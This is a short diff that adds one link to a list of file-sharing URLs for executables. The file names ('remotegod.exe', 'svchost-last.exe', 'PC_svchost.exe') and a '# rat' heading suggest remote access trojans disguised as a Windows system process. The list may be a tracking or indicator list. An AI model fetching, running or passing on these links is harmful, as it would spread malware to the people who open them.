@@ -14,6 +14,8 @@ https://anonsharing.com/file/9cd0654594bf837a/remotegod.exe
 
 https://anonsharing.com/file/4fc32ec0c7822b3b/svchost-last.exe
 
+https://anonsharing.com/file/88838014472dfdb9/PC_svchost.exe
+
 # rat
 
 https://anonsharing.com/file/30b2d157c4b63190/main.exe
